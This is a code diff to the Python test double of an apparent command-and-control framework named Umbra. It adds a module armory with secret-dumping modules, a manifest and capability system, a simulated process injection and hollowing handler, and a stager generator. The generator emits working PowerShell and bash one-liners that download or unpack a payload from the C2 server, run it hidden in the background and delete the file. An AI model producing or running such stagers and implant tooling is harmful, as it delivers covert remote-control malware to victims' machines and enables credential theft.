@@ -36,6 +36,7 @@ sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from umbra_cli import crypto, handshake, netio, peer, session, upk, wire, ws  # noqa: E402
 
 import batch_transports  # noqa: E402
+import module_runtime  # noqa: E402
 import vpn_transport  # noqa: E402
 
 
@@ -70,7 +71,20 @@ AGENT_CAPS = [
     "evade.profile", "evade.shape", "evade.killswitch", "hygiene.memory",
     "hygiene.process", "wmi.exec", "smb.exec", "winrm.exec", "dcom.exec",
     "ldap.query", "ssh.exec",
+    # The loaders of the module ecosystem and the crypto the scripts and
+    # the webassembly modules use.
+    "wasm", "script", "shellcode", "crypto",
 ]
+
+# The module ABI.
+#
+# A module is a blob and a manifest.  The manifest opens with a magic and
+# carries the version of the dialect it is written in, the argument schema,
+# the output schema and the capabilities the module needs from the host.
+# The server refuses to push a module to a host that lacks one of them, and
+# the implant refuses to run a module whose manifest it cannot read.
+MODULE_MAGIC = "UMBRAMOD1"
+MODULE_ABI = 1
 
 
 def _substitute_output(args: Dict[str, Any], output: bytes) -> Dict[str, Any]:
@@ -147,6 +161,303 @@ def _parse_scan_ports(spec: str) -> List[int]:
 
 def new_id(prefix: str) -> str:
     return f"{prefix}-{crypto.random_bytes(4).hex()}"
+
+
+# ---------------------------------------------------------------------------
+# the module ABI
+#
+# The manifest of a module is what the server verifies, what the operator
+# reads and what the implant checks before it runs anything.  The helpers
+# below build it in the three shapes it travels in: the catalogue view the
+# operator sees, the search index and the wire form that goes into the task.
+# ---------------------------------------------------------------------------
+def _module_view(entry: Dict[str, Any]) -> Dict[str, Any]:
+    """The catalogue view of a module."""
+    schema = list(entry.get("args") or [])
+    return {
+        "name": entry["name"],
+        "version": entry.get("version", ""),
+        "os": entry.get("os", "windows"),
+        "arch": entry.get("arch", "amd64"),
+        "format": entry.get("format", "coff"),
+        "sha256": entry.get("sha256", ""),
+        "size": entry.get("size", 0),
+        "description": entry.get("description", ""),
+        "magic": entry.get("magic", MODULE_MAGIC),
+        "abi": int(entry.get("abi", MODULE_ABI)),
+        "caps": list(entry.get("caps") or []),
+        "requires": list(entry.get("requires") or []),
+        "args": [a.get("name", "") for a in schema],
+        "schema": schema,
+        "output": dict(entry.get("output") or {}),
+    }
+
+
+def _module_matches(entry: Dict[str, Any], needle: str) -> bool:
+    """Whether a module matches a lower case search query."""
+    fields = [
+        entry.get("name", ""),
+        entry.get("description", ""),
+        entry.get("os", ""),
+        entry.get("arch", ""),
+        entry.get("format", ""),
+        entry.get("version", ""),
+    ]
+    fields.extend(entry.get("caps") or [])
+    fields.extend(entry.get("requires") or [])
+    for field in fields:
+        if needle in str(field).lower():
+            return True
+    for arg in entry.get("args") or []:
+        if needle in f"{arg.get('name', '')} {arg.get('help', '')}".lower():
+            return True
+    return False
+
+
+def _module_manifest(entry: Dict[str, Any]) -> Dict[str, Any]:
+    """The manifest that travels with the module inside the task.
+
+    The implant reads this one: it refuses a module whose manifest it cannot
+    read, it refuses a module that needs a capability it does not have and it
+    refuses arguments that do not fit the schema.
+    """
+    schema = list(entry.get("args") or [])
+    args = []
+    for arg in schema:
+        item = {
+            "name": arg.get("name", ""),
+            "type": arg.get("type", "string"),
+            "required": bool(arg.get("required")),
+        }
+        if arg.get("default"):
+            item["default"] = arg["default"]
+        if arg.get("help"):
+            item["help"] = arg["help"]
+        args.append(item)
+    manifest = {
+        "magic": entry.get("magic", MODULE_MAGIC),
+        "abi": int(entry.get("abi", MODULE_ABI)),
+        "name": entry["name"],
+        "version": entry.get("version", ""),
+        "description": entry.get("description", ""),
+        "os": entry.get("os", "windows"),
+        "arch": entry.get("arch", "amd64"),
+        "format": entry.get("format", "coff"),
+        "digest": "sha256:" + entry.get("sha256", ""),
+        "caps": list(entry.get("caps") or []),
+        "args": args,
+        "output": dict(entry.get("output") or {}),
+    }
+    return manifest
+
+
+def _argument_fits(kind: str, value: Any) -> bool:
+    """Whether a value fits the declared type of an argument."""
+    if kind == "string":
+        return isinstance(value, str)
+    if kind == "int":
+        return isinstance(value, int) and not isinstance(value, bool)
+    if kind == "bool":
+        return isinstance(value, bool)
+    if kind == "bytes":
+        return isinstance(value, (bytes, bytearray))
+    # An unknown kind is a module that says nothing about its argument: the
+    # value is passed through unchanged.
+    return True
+
+
+def _module_arguments(manifest: Dict[str, Any], args: Dict[str, Any]) -> Dict[str, Any]:
+    """Check the arguments of a module against its schema.
+
+    A required argument that is missing stops the module, and a value of the
+    wrong kind stops it too: a module that asks for a number and gets a word
+    would fail in a way the operator cannot see.
+    """
+    out: Dict[str, Any] = {}
+    for arg in manifest.get("args") or []:
+        name = str(arg.get("name", ""))
+        if not name:
+            continue
+        kind = str(arg.get("type", "string") or "string")
+        if name in args:
+            value = args[name]
+            if not _argument_fits(kind, value):
+                raise ValueError(
+                    f"the argument {name} of the module is a {kind}")
+            out[name] = value
+            continue
+        default = arg.get("default")
+        if default not in (None, ""):
+            out[name] = default
+            continue
+        if arg.get("required"):
+            raise ValueError(f"the module needs the argument {name}")
+    for name, value in args.items():
+        out.setdefault(name, value)
+    return out
+
+
+def _render_stager(platform: str, transport: str, server: str, url: str,
+                   digest: str, agent_id: str, mode: str, store_name: str,
+                   store_base: str, args: Dict[str, Any]) -> Optional[str]:
+    """Render a stager, the way the Go server renders it.
+
+    The test double mirrors the shapes of the real stager: the download
+    stager, the stager that pulls the beacon from the file store of the
+    server, the offline stager that carries the beacon inside itself, and
+    the shim that only proves the digest.  The environment it exports is
+    the one the implant expects for that transport.
+    """
+    if platform not in ("windows", "linux", "macos"):
+        return None
+    if transport not in ("tcp", "http", "ws", "dns", "smtp", "s3"):
+        return None
+    if mode not in ("download", "store", "offline", "shim"):
+        return None
+    env = [
+        f"UMBRA_SERVER={server}",
+        f"UMBRA_TRANSPORT={transport}",
+        f"UMBRA_SLEEP=5",
+        f"UMBRA_JITTER=20",
+    ]
+    if agent_id:
+        env.append(f"UMBRA_AGENT_ID={agent_id}")
+    if transport == "http":
+        env.append(f"UMBRA_HTTP_PATH={args.get('http_path', '/api/v1/beacon')}")
+    if transport == "ws":
+        env.append(f"UMBRA_WS_PATH={args.get('ws_path', '/api/v1/beacon')}")
+    if transport == "dns":
+        if args.get("dns_resolver"):
+            env.append(f"UMBRA_DNS_RESOLVER={args['dns_resolver']}")
+        if args.get("dns_domain"):
+            env.append(f"UMBRA_DNS_DOMAIN={args['dns_domain']}")
+    if transport == "smtp":
+        if args.get("smtp_addr"):
+            env.append(f"UMBRA_SMTP_ADDR={args['smtp_addr']}")
+        if args.get("pop3_addr"):
+            env.append(f"UMBRA_POP3_ADDR={args['pop3_addr']}")
+    if transport == "s3":
+        if args.get("s3_endpoint"):
+            env.append(f"UMBRA_S3_ENDPOINT={args['s3_endpoint']}")
+        if args.get("s3_region"):
+            env.append(f"UMBRA_S3_REGION={args['s3_region']}")
+
+    payload_url = url
+    if mode == "store":
+        if not store_name or not store_base:
+            return None
+        base = store_base.rstrip("/")
+        if not base.startswith(("http://", "https://")):
+            base = "http://" + base
+        payload_url = f"{base}/api/v1/artifact/{store_name}"
+    if mode == "shim":
+        if not digest or not url:
+            return None
+    if mode in ("download", "shim") and not payload_url:
+        return None
+
+    windows = platform == "windows"
+    if mode == "offline":
+        blob = args.get("payload")
+        if isinstance(blob, str):
+            blob = blob.encode()
+        if not blob:
+            return None
+        encoded = base64.b64encode(bytes(blob)).decode()
+        if windows:
+            script = ("$ErrorActionPreference='Stop';"
+                      f"$b='{encoded}';"
+                      "$t=[IO.Path]::GetTempFileName();"
+                      "[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String($b));")
+        else:
+            script = ("set -e;"
+                      f"b='{encoded}';"
+                      "t=$(mktemp);"
+                      "printf '%s' \"$b\" | base64 -d > \"$t\";")
+    elif windows:
+        script = ("$ErrorActionPreference='Stop';"
+                  f"$u='{payload_url}';"
+                  "$t=[IO.Path]::GetTempFileName();"
+                  "Invoke-WebRequest -Uri $u -OutFile $t;")
+    else:
+        script = ("set -e;"
+                  f"u='{payload_url}';"
+                  "t=$(mktemp);"
+                  "curl -fsSL \"$u\" -o \"$t\";")
+    if digest:
+        if windows:
+            script += (f"$h='{digest.lower()}';"
+                       "if((Get-FileHash -Algorithm SHA256 $t).Hash.ToLower() "
+                       "-ne $h){Remove-Item $t;throw 'umbra: digest mismatch'};")
+        else:
+            script += (f"echo '{digest.lower()}  \"$t\"' "
+                       "| sha256sum -c - >/dev/null;")
+    if mode == "shim":
+        # The shim only proves the digest and hands the path over.
+        script += "Write-Output $t;" if windows else "printf '%s' \"$t\";"
+        return script
+    if windows:
+        for item in env:
+            script += f"$env:{item};"
+        script += ("Start-Process -FilePath $t -ArgumentList '-server',"
+                   "'$env:UMBRA_SERVER' -WindowStyle Hidden;")
+        script += "Remove-Item $t -ErrorAction SilentlyContinue;"
+    else:
+        script += "chmod +x \"$t\";"
+        for item in env:
+            script += f"export {item};"
+        script += "\"$t\" >/dev/null 2>&1 &"
+        script += "rm -f \"$t\";"
+    return script
+
+
+def _module_key(values: Dict[str, Any]) -> bytes:
+    """The key a module decrypts with, read from its arguments."""
+    raw = values.get("key")
+    if not isinstance(raw, str):
+        return b""
+    try:
+        return bytes.fromhex(raw.strip())
+    except ValueError:
+        return b""
+
+
+def _run_wasm(data: bytes, values: Dict[str, Any], caps: List[str],
+              name: str) -> Tuple[int, bytes, str, Dict[str, Any]]:
+    """Run a webassembly module in memory.
+
+    The interpreter is the twin of the one in the implant: the same subset,
+    the same host API and the same refusals.
+    """
+    try:
+        code, out = module_runtime.run_wasm(data, list(caps), _module_key(values))
+    except module_runtime.ModuleError as exc:
+        return 1, b"", str(exc), {}
+    return 0, out, "", {
+        "module": name,
+        "format": "wasm",
+        "code": code,
+    }
+
+
+def _run_script(data: bytes, values: Dict[str, Any], caps: List[str],
+                name: str) -> Tuple[int, bytes, str, Dict[str, Any]]:
+    """Run a script module in memory.
+
+    The dialect is the twin of the one in the implant: the same grammar,
+    the same host API and the same refusals.
+    """
+    source = data.decode("utf-8", "replace")
+    arguments = {str(key): str(value) for key, value in values.items()}
+    try:
+        code, out = module_runtime.run_script(source, list(caps), arguments)
+    except module_runtime._ScriptError as exc:
+        return 1, b"", str(exc), {}
+    return 0, out, "", {
+        "module": name,
+        "format": "script",
+        "code": code,
+    }
 
 
 # ---------------------------------------------------------------------------
@@ -625,20 +936,84 @@ class MockServer:
         self.jitter = 20
 
     def _install_default_armory(self) -> None:
-        """Register the two modules the test double knows about."""
-        for name, description, args in (
-            ("whoami", "print the token of the current user", ["domain"]),
-            ("lsecrets", "list the secrets of the machine", []),
-        ):
-            blob = f"UMBRA-MODULE:{name}".encode()
-            self.armory[name] = {
-                "name": name,
-                "sha256": hashlib.sha256(blob).hexdigest(),
-                "size": len(blob),
-                "description": description,
-                "args": args,
-                "data": blob,
-            }
+        """Register the modules the test double knows about.
+
+        Every module carries a full manifest: the magic, the ABI number, the
+        argument schema, the output schema and the capabilities it needs from
+        the host.  The server refuses to push a module to an agent that lacks
+        one of them, and the test double does the same, so the two agree on
+        what a module is allowed to do.
+        """
+        modules = (
+            {
+                "name": "whoami",
+                "version": "1.2.0",
+                "description": "print the token of the current user",
+                "format": "coff",
+                "caps": ["shell"],
+                "args": [
+                    {"name": "domain", "type": "string", "required": False,
+                     "help": "the domain to report"},
+                ],
+                "output": {"type": "text", "description": "the account name"},
+                "requires": [],
+            },
+            {
+                "name": "lsecrets",
+                "version": "1.0.0",
+                "description": "list the secrets of the machine",
+                "format": "coff",
+                "caps": [],
+                "args": [],
+                "output": {"type": "json", "description": "the secrets found"},
+                "requires": [],
+            },
+            {
+                "name": "dump-secrets",
+                "version": "2.0.0",
+                "description": "dump the secrets, with the reader it needs",
+                "format": "coff",
+                "caps": ["shell"],
+                "args": [
+                    {"name": "path", "type": "string", "required": True,
+                     "help": "where to look"},
+                ],
+                "output": {"type": "json", "description": "the secrets found"},
+                "requires": ["lsecrets"],
+            },
+            {
+                "name": "wmi-probe",
+                "version": "1.0.0",
+                "description": "ask the host about its own instruments",
+                "format": "coff",
+                # The test double does not have this capability, so the
+                # server must refuse to push the module to it.
+                "caps": ["wmi.instrument"],
+                "args": [],
+                "output": {"type": "text", "description": "the instruments"},
+                "requires": [],
+            },
+        )
+        for module in modules:
+            blob = f"UMBRA-MODULE:{module['name']}".encode()
+            entry = dict(module)
+            entry["magic"] = MODULE_MAGIC
+            entry["abi"] = MODULE_ABI
+            entry["sha256"] = hashlib.sha256(blob).hexdigest()
+            entry["size"] = len(blob)
+            entry["data"] = blob
+            self.armory[module["name"]] = entry
+
+    def agent_caps(self, agent_id: str) -> List[str]:
+        """The capabilities an agent advertised in its handshake.
+
+        An agent that says nothing is allowed everything: the list did not
+        exist before a certain version of the framework, and refusing every
+        module on such an agent would break every old beacon at once.
+        """
+        with self._lock:
+            record = self.agents.get(agent_id) or {}
+        return list(record.get("caps") or [])
 
     def _install_default_aliases(self) -> None:
         """Register the saved commands the test double knows about."""
@@ -2290,7 +2665,12 @@ class MockServer:
         "vpn.route": "operator",
         "vpn.ping": "operator",
         "armory.list": "viewer",
+        "armory.search": "viewer",
+        "armory.needs": "viewer",
+        "armory.versions": "viewer",
+        "armory.resolve": "viewer",
         "armory.install": "operator",
+        "armory.import": "operator",
         "armory.run": "operator",
         "armory.remove": "admin",
         "alias.list": "viewer",
@@ -3349,21 +3729,117 @@ class MockServer:
             with self._lock:
                 installed = [dict(e) for e in self.armory.values()]
             return ok({
-                "entries": [
+                "entries": [_module_view(e) for e in installed],
+                "installed": [
                     {
                         "name": e["name"],
-                        "version": "1.0",
-                        "os": "windows",
-                        "arch": "amd64",
-                        "format": "coff",
+                        "version": e.get("version", ""),
                         "sha256": e["sha256"],
                         "size": e["size"],
-                        "description": e.get("description", ""),
-                        "args": e.get("args", []),
+                        "installed": _now(),
+                        "caps": list(e.get("caps") or []),
+                        "format": e.get("format", ""),
                     }
                     for e in installed
                 ],
-                "installed": installed,
+                "verified": True,
+            })
+
+        if cmd == "armory.search":
+            query = str(args.get("query", "")).strip().lower()
+            with self._lock:
+                entries = [dict(e) for e in self.armory.values()]
+            found = [e for e in entries if not query or _module_matches(e, query)]
+            found.sort(key=lambda e: e["name"])
+            return ok({
+                "entries": [_module_view(e) for e in found],
+                "count": len(found),
+                "query": query,
+            })
+
+        if cmd == "armory.needs":
+            name = str(args.get("name", ""))
+            if not name:
+                return fail("armory.needs needs a name")
+            with self._lock:
+                entry = self.armory.get(name)
+            if entry is None:
+                return fail(f"unknown extension {name!r}")
+            missing = [dep for dep in entry.get("requires", [])
+                       if dep not in self.armory]
+            return ok({
+                "name": entry["name"],
+                "version": entry.get("version", ""),
+                "format": entry.get("format", ""),
+                "os": entry.get("os", "windows"),
+                "arch": entry.get("arch", "amd64"),
+                "digest": entry.get("sha256", ""),
+                "caps": list(entry.get("caps") or []),
+                "args": list(entry.get("args") or []),
+                "output": dict(entry.get("output") or {}),
+                "requires": list(entry.get("requires") or []),
+                "missing": missing,
+            })
+
+        if cmd == "armory.versions":
+            name = str(args.get("name", ""))
+            if not name:
+                return fail("armory.versions needs a name")
+            with self._lock:
+                versions = sorted(
+                    [e.get("version", "") for e in self.armory.values()
+                     if e["name"] == name],
+                    reverse=True,
+                )
+            return ok({"name": name, "versions": versions, "count": len(versions)})
+
+        if cmd == "armory.resolve":
+            name = str(args.get("name", ""))
+            if not name:
+                return fail("armory.resolve needs a name")
+            with self._lock:
+                entry = self.armory.get(name)
+            if entry is None:
+                return fail(f"unknown extension {name!r}")
+            order = []
+            seen = set()
+
+            def visit(current: str) -> None:
+                if current in seen:
+                    return
+                seen.add(current)
+                with self._lock:
+                    dep = self.armory.get(current)
+                if dep is None:
+                    return
+                for required in dep.get("requires", []):
+                    visit(required)
+                order.append(current)
+
+            visit(name)
+            return ok({
+                "name": name,
+                "order": order,
+                "count": len(order),
+                "modules": [_module_view(self.armory[n]) for n in order
+                            if n in self.armory],
+                "resolved": True,
+            })
+
+        if cmd == "armory.import":
+            url = str(args.get("url", ""))
+            if not url:
+                return fail("armory.import needs an url")
+            # The test double has no mirror to talk to.  It answers with the
+            # catalogue it already holds, so the console path is exercised
+            # end to end; the real server fetches the catalogue over https
+            # and verifies every signature before it merges it.
+            with self._lock:
+                count = len(self.armory)
+            return ok({
+                "source": url,
+                "entries": count,
+                "url": url,
                 "verified": True,
             })
 
@@ -3377,6 +3853,7 @@ class MockServer:
                 return fail(f"unknown extension {name!r}")
             return ok({
                 "name": entry["name"],
+                "version": entry.get("version", ""),
                 "sha256": entry["sha256"],
                 "size": entry["size"],
                 "installed": _now(),
@@ -3400,11 +3877,27 @@ class MockServer:
                 return fail(f"unknown extension {name!r}")
             if not known:
                 return fail(f"unknown agent {agent_id!r}")
+            # The capability negotiation: a module that needs something the
+            # host cannot do is never pushed to it.  The agent says what it
+            # can do in its handshake; an agent that says nothing is allowed
+            # everything, because it predates the list.
+            caps = self.agent_caps(agent_id)
+            missing = [c for c in entry.get("caps", []) if c not in caps]
+            if missing:
+                return fail(
+                    f"the agent {agent_id} cannot run {name}: it lacks "
+                    f"{', '.join(missing)}"
+                )
             task = {
                 "id": new_id("t"),
                 "agent_id": agent_id,
                 "kind": "ext",
-                "args": {"name": name, "data": entry["data"], "args": args.get("args") or {}},
+                "args": {
+                    "name": name,
+                    "data": entry["data"],
+                    "args": args.get("args") or {},
+                    "manifest": _module_manifest(entry),
+                },
                 "state": "queued",
                 "code": 0,
                 "out": b"",
@@ -3431,11 +3924,27 @@ class MockServer:
                 return fail(f"unknown alias {name!r}")
             if not known:
                 return fail(f"unknown agent {agent_id!r}")
+            task_args = {**entry.get("args", {}), **(args.get("args") or {})}
+            # An alias that names an extension expands into the module
+            # task, and the manifest of that module travels with it: the
+            # target refuses a module it cannot read.
+            extension = str(entry.get("extension", "") or "")
+            if extension:
+                with self._lock:
+                    module = self.armory.get(extension)
+                if module is None:
+                    return fail(f"unknown extension {extension!r}")
+                task_args = {
+                    "name": extension,
+                    "data": module["data"],
+                    "args": task_args,
+                    "manifest": _module_manifest(module),
+                }
             task = {
                 "id": new_id("t"),
                 "agent_id": agent_id,
                 "kind": entry["kind"],
-                "args": {**entry.get("args", {}), **(args.get("args") or {})},
+                "args": task_args,
                 "state": "queued",
                 "code": 0,
                 "out": b"",
@@ -3468,18 +3977,28 @@ class MockServer:
             url = str(args.get("url", ""))
             digest = str(args.get("sha256", ""))
             agent_id = str(args.get("agent_id", ""))
-            script = (
-                "# umbra stager (mock)\n"
-                f"$UMBRA_SERVER = '{server}'\n"
-                f"$UMBRA_TRANSPORT = '{transport}'\n"
-                f"$UMBRA_AGENT_ID = '{agent_id}'\n"
-                f"$UMBRA_URL = '{url}'\n"
-                f"$UMBRA_SHA256 = '{digest}'\n"
+            mode = str(args.get("mode", "download"))
+            store_name = str(args.get("store", ""))
+            store_base = str(args.get("store_base", ""))
+            script = _render_stager(
+                platform=platform,
+                transport=transport,
+                server=server,
+                url=url,
+                digest=digest,
+                agent_id=agent_id,
+                mode=mode,
+                store_name=store_name,
+                store_base=store_base,
+                args=args,
             )
+            if script is None:
+                return fail("stager.generate: the stager cannot be rendered")
             return ok({
                 "platform": platform,
                 "transport": transport,
                 "server": server,
+                "mode": mode,
                 "stager": script,
             })
 
@@ -4068,6 +4587,108 @@ class FakeAgent(threading.Thread):
             "tokens_total": len(tokens),
         }
 
+    def _module(self, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
+        """Run a module in memory.
+
+        The manifest is the contract: it says what the module is, what it
+        needs from the host and what it takes.  The implant refuses a module
+        whose manifest it cannot read, a module that needs a capability it
+        does not have, and arguments that do not fit the schema.  The refusal
+        happens here, on the target, and the reason travels back with the
+        result.
+        """
+        data = args.get("data") or b""
+        name = str(args.get("name", "module"))
+        raw = args.get("manifest")
+        if not isinstance(raw, dict):
+            return 1, b"", "the module has no manifest", {}
+        magic = str(raw.get("magic", ""))
+        if magic != MODULE_MAGIC:
+            return 1, b"", f"the manifest of the module is not one of ours: {magic}", {}
+        abi = int(raw.get("abi", 0) or 0)
+        if abi != MODULE_ABI:
+            return 1, b"", (f"the module speaks the version {abi} of the module ABI, "
+                            f"this implant speaks {MODULE_ABI}"), {}
+        caps = list(raw.get("caps") or [])
+        missing = [cap for cap in caps if cap not in AGENT_CAPS]
+        if missing:
+            return 1, b"", ("the module needs what this implant cannot do: "
+                            + ", ".join(missing)), {}
+        module_args = args.get("args") or {}
+        if not isinstance(module_args, dict):
+            module_args = {}
+        try:
+            values = _module_arguments(raw, module_args)
+        except ValueError as exc:
+            return 1, b"", str(exc), {}
+        fmt = str(raw.get("format", "coff") or "coff").lower()
+        if fmt in ("wasm", "webassembly"):
+            return _run_wasm(bytes(data), values, caps, name)
+        if fmt == "script":
+            return _run_script(bytes(data), values, caps, name)
+        if fmt not in ("coff", "bof", "pe", "object", "shellcode"):
+            return 1, b"", f"the format {fmt} of the module is not one I know", {}
+        return 0, f"module {name} ran in memory ({len(bytes(data))} bytes)\n".encode(), "", {
+            "module": name,
+            "format": fmt,
+            "args": values,
+        }
+
+    def _inject(self, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
+        """Move a payload into a process.
+
+        The test double cannot move anything into a real process, but it
+        answers exactly like the implant does: the same report, the same
+        metadata and the same refusals.  The rules are the ones of the
+        implant: a migration needs a target and an image, and a migration
+        that moves the implant out of its own process asks the beacon to
+        stop.
+        """
+        mode = str(args.get("mode", "reflect") or "reflect")
+        payload = args.get("data") or b""
+        if isinstance(payload, str):
+            payload = payload.encode()
+        payload = bytes(payload)
+        if mode != "migrate":
+            pid = int(args.get("pid", 0) or 0)
+            if not pid:
+                return 1, b"", "inject requires args.pid", {}
+            return 0, (f"reflected {len(payload)} bytes into pid {pid}\n"
+                       ).encode(), "", {"inject_pid": pid}
+        pid = int(args.get("pid", 0) or 0)
+        spawn = str(args.get("spawn", "") or "")
+        if not pid and not spawn:
+            return 1, b"", ("migrate: the migration needs a target "
+                            "(args.pid or args.spawn)"), {}
+        if not payload:
+            return 1, b"", "migrate: the migration needs an image to move", {}
+        outbound = bool(args.get("out", False))
+        resumed = bool(args.get("resume", False))
+        # The test double hands out a pid of its own, so the report of the
+        # migration is the one the operator expects.
+        target = pid or 4242
+        lines = [f"moved {len(payload)} bytes into pid {target} "
+                 f"({'spawned by the implant' if spawn else 'already running'})"]
+        if not spawn:
+            lines.append("suspended and resumed 1 threads of the target")
+        elif not resumed:
+            lines.append("the process stays hollow: the payload is the only "
+                         "thing in it")
+        lines.append("the new process inherits the identity of the agent")
+        meta: Dict[str, Any] = {
+            "migrated": True,
+            "migrate_pid": target,
+            "migrate_spawned": bool(spawn),
+            "migrate_threads": 0 if spawn else 1,
+            "migrate_agent": self.agent_id,
+        }
+        if outbound:
+            # The implant leaves its own process: the answer is sent first,
+            # and the beacon stops right after it.
+            meta["exit_after"] = True
+            self._stop.set()
+        return 0, ("\n".join(lines) + "\n").encode(), "", meta
+
     def _escalate(self, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
         """The privilege escalation of the fake host."""
         mode = str(args.get("mode", "privileges") or "privileges")
@@ -4490,9 +5111,9 @@ class FakeAgent(threading.Thread):
         if kind == "tunnel":
             return self._tunnel(args)
         if kind in ("ext", "bof"):
-            data = args.get("data") or b""
-            name = str(args.get("name", "module"))
-            return 0, f"module {name} ran in memory ({len(bytes(data))} bytes)\n".encode(), "", {}
+            return self._module(args)
+        if kind == "inject":
+            return self._inject(args)
         if kind == "triage":
             path = str(args.get("path", ""))
             try:
